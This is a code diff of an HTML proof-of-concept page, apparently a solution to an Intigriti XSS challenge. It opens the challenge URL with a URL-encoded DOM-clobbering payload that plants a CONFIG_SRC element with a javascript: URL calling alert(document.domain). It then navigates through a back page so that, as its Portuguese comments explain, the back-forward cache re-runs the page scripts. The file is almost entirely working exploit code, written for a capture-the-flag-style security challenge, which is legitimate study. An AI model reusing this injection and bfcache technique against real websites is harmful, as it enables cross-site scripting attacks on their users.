@@ -1,13 +1,15 @@
 <html>
-
 <body>
-    <script>
-        let begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG%5FSRC%20data%2Durl%3Djavascript:alert()>test</div><strong>a"
-        let w = window.open(begin)
-        setTimeout(d => {
-            w.location = '/back.html?n=1'
-        }, 5000)
-    </script>
-</body>
+<script>
+    const begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
+    
+    const w = window.open(begin);
 
+    // Dá tempo para a página inicializar e o bfcache armazenar o estado do DOM com o CONFIG_SRC
+    setTimeout(() => {
+        // Força o histórico a retornar à página anterior, disparando a reexecução dos scripts
+        w.location = "/back.html?n=1";
+    }, 3000);
+</script>
+</body>
 </html>
